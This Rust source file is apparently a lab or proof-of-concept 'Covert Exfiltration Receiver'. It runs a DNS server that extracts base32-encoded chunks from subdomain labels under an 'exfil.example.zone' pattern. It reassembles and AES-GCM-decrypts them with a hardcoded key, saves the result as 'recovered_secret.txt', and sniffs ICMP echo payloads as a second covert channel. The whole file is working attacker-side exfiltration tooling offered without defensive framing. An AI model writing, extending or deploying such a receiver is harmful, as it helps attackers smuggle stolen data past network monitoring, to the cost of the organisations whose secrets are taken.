use anyhow::{Context, Result};
use async_trait::async_trait;
use clap::Parser;
use covert_core::{
    decrypt_aes_gcm,
    encoding::from_base32,
};
use hickory_proto::op::{Header, MessageType, ResponseCode};
use hickory_server::authority::MessageResponseBuilder;
use hickory_server::server::{Request, RequestHandler, ResponseHandler, ResponseInfo, ServerFuture};
use pnet::datalink::{self, Channel, Config};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
use pnet::packet::icmp::{IcmpPacket, IcmpTypes};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::Packet;
use std::sync::{Arc, Mutex};
use tokio::net::UdpSocket;
use tokio::task;

#[derive(Parser)]
#[command(name = "covert-receiver")]
struct Args {
    #[arg(long, default_value = "5371")]
    port: u16,

    #[arg(long, default_value = "0.0.0.0")]
    bind: String,
}

#[derive(Clone)]
struct ExfilHandler {
    chunks: Arc<Mutex<Vec<Vec<u8>>>>,
}

impl ExfilHandler {
    fn new() -> Self {
        Self {
            chunks: Arc::new(Mutex::new(Vec::new())),
        }
    }

    fn try_reassemble(&self) {
        let mut guard = self.chunks.lock().unwrap();

        if guard.len() < 2 {
            println!("Not enough chunks yet: {}", guard.len());
            return;
        }

        println!("\n=== Trying to reassemble {} chunks ===", guard.len());

        let full: Vec<u8> = guard.iter().flat_map(|c| c.iter().copied()).collect();

        if full.len() < 12 {
            println!("Too little data: {} bytes", full.len());
            return;
        }

        let nonce: [u8; 12] = match full[0..12].try_into() {
            Ok(n) => n,
            Err(_) => {
                println!("Failed to extract nonce");
                return;
            }
        };

        let ciphertext = &full[12..];
        let key = [42u8; 32];

        println!("Decrypting: ciphertext = {} bytes", ciphertext.len());

        match decrypt_aes_gcm(ciphertext, &key, &nonce) {
            Ok(plaintext) => {
                println!("DECRYPTION SUCCESS! plaintext = {} bytes", plaintext.len());
                println!("First 64 bytes (hex):");

                for chunk in plaintext.chunks(16) {
                    print!("  ");
                    for b in chunk {
                        print!("{:02x} ", b);
                    }
                    println!();
                }

                if let Ok(text) = String::from_utf8(plaintext.clone()) {
                    println!("\nRecovered as UTF-8:\n{}", text);
                } else {
                    println!("Not valid UTF-8 — trying UTF-16LE");

                    if plaintext.len() % 2 == 0 {
                        let utf16: Vec<u16> = plaintext
                            .chunks_exact(2)
                            .map(|c| u16::from_le_bytes([c[0], c[1]]))
                            .collect();

                        if let Ok(text) = String::from_utf16(&utf16) {
                            println!("\nRecovered as UTF-16LE:\n{}", text);
                        } else {
                            println!("Not valid UTF-16LE either");
                        }
                    } else {
                        println!("Length not even — cannot be UTF-16");
                    }
                }

                if let Err(e) = std::fs::write("recovered_secret.txt", &plaintext) {
                    println!("Error saving file: {}", e);
                } else {
                    println!("Saved raw plaintext to recovered_secret.txt");
                }

                guard.clear();
            }
            Err(e) => {
                println!("AES-GCM decryption error: {}", e);
            }
        }
    }
}

#[async_trait]
impl RequestHandler for ExfilHandler {
    async fn handle_request<R: ResponseHandler + Send>(
        &self,
        request: &Request,
        mut response_handle: R,
    ) -> ResponseInfo {
        let src = request.src();
        let qname = request
            .queries()
            .first()
            .map(|q| q.name().to_string())
            .unwrap_or_default();

        println!("[DNS] Query from {}: {}", src, qname);

        if let Some(query) = request.queries().first() {
            let labels: Vec<String> = query
                .name()
                .iter()
                .map(|l| String::from_utf8_lossy(l).to_string())
                .collect();

            if labels.len() >= 4 {
                let chunk_str = &labels[0];
                let exfil = labels[1].to_lowercase();
                let example = labels[2].to_lowercase();
                let zone = labels[3].to_lowercase();

                if zone.contains("zone")
                    && example.contains("example")
                    && exfil.contains("exfil")
                {
                    println!(
                        "\n=== Decoding chunk ({} characters) ===",
                        chunk_str.len()
                    );

                    match from_base32(chunk_str) {
                        Ok(decoded) => {
                            println!("Success: {} bytes", decoded.len());
                            println!(
                                "First 16 bytes: {:02x?}",
                                &decoded[..16.min(decoded.len())]
                            );

                            let mut chunks = self.chunks.lock().unwrap();
                            chunks.push(decoded);
                            drop(chunks);

                            self.try_reassemble();
                        }
                        Err(e) => println!("Decode error: {}", e),
                    }
                } else {
                    println!("Domain does not match expected pattern");
                }
            }
        }

        let builder = MessageResponseBuilder::from_message_request(request);
        let mut header = Header::new();
        header.set_id(request.header().id());
        header.set_message_type(MessageType::Response);
        header.set_response_code(ResponseCode::NoError);
        header.set_recursion_desired(request.header().recursion_desired());

        let response = builder.build_no_records(header);

        match response_handle.send_response(response).await {
            Ok(info) => info,
            Err(e) => {
                eprintln!("send_response failed: {}", e);

                let err_builder = MessageResponseBuilder::from_message_request(request);
                let mut err_header = Header::new();
                err_header.set_id(request.header().id());
                err_header.set_message_type(MessageType::Response);
                err_header.set_response_code(ResponseCode::ServFail);

                let err_response = err_builder.build_no_records(err_header.clone());
                let _ = response_handle.send_response(err_response).await;

                err_header.into()
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    println!("=== Covert Exfiltration Receiver ===");

    let bind_addr = format!("{}:{}", args.bind, args.port);
    println!("Starting DNS listener on {}", bind_addr);

    let handler = ExfilHandler::new();

    let tokio_sock = UdpSocket::bind(&bind_addr)
        .await
        .context("bind failed")?;
    let std_sock = tokio_sock
        .into_std()
        .context("into_std failed")?;

    let mut server = ServerFuture::new(handler.clone());
    server.register_socket_std(std_sock)?;

    println!("DNS listening on {}", bind_addr);

    tokio::spawn(async move {
        let _ = server.block_until_done().await;
    });

    task::spawn_blocking(move || {
        let iface = datalink::interfaces()
            .into_iter()
            .find(|i| !i.is_loopback() && i.ips.iter().any(|ip| ip.is_ipv4()))
            .expect("No IPv4 interface");

        println!("ICMP listening → {}", iface.name);

        let mut rx = match datalink::channel(&iface, Config::default()) {
            Ok(Channel::Ethernet(_, rx)) => rx,
            _ => panic!("Expected Ethernet channel"),
        };

        println!("ICMP sniffer started...");

        loop {
            if let Ok(frame) = rx.next() {
                if let Some(eth) = EthernetPacket::new(frame) {
                    if eth.get_ethertype() == EtherTypes::Ipv4 {
                        if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                            if ip.get_next_level_protocol()
                                == pnet::packet::ip::IpNextHeaderProtocols::Icmp
                            {
                                if let Some(icmp) = IcmpPacket::new(ip.payload()) {
                                    if icmp.get_icmp_type() == IcmpTypes::EchoRequest {
                                        let payload = icmp.payload();
                                        if !payload.is_empty() {
                                            println!(
                                                "[ICMP] from {} | len: {}",
                                                ip.get_source(),
                                                payload.len()
                                            );
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    });

    println!("Both channels active. Ctrl+C to exit");
    tokio::signal::ctrl_c().await?;
    Ok(())
}